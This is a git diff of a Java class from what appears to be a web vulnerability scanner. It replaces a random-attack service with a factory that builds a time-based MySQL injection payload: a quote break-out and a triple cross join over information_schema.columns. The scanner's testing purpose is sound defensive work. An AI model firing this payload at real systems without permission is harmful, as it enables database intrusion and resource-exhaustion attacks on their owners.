@@ -13,31 +13,27 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package com.watchrabbit.scanner.attacker.service;
+package com.watchrabbit.scanner.attacker.attack;
 
-import com.watchrabbit.scanner.attacker.attack.AttackFactory;
 import com.watchrabbit.scanner.attacker.model.Attack;
-import java.util.List;
-import java.util.Random;
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.stereotype.Service;
+import com.watchrabbit.scanner.attacker.verify.MySqlHeavyQueryVerificationStrategy;
+import org.springframework.stereotype.Component;
 
 /**
  *
  * @author Mariusz
  */
-@Service
-public class AttackServiceImpl implements AttackService {
-
-    private final Random random = new Random();
-
-    @Autowired
-    List<AttackFactory> factories;
+@Component
+public class MySQLHeavyQueryFactory implements AttackFactory {
 
     @Override
-    public Attack getRandomAttack() {
-        return factories.get(random.nextInt(factories.size()))
-                .produce();
+    public Attack produce() {
+        return new Attack.Builder()
+                .withAttackGenerator(value
+                        -> value + "' and (select count(*) from information_schema.columns, information_schema.columns T1, information_schema.columns T2) and 1='1"
+                ).withId("injectionMysql1")
+                .withVerificationStrategy(new MySqlHeavyQueryVerificationStrategy())
+                .build();
     }
 
 }
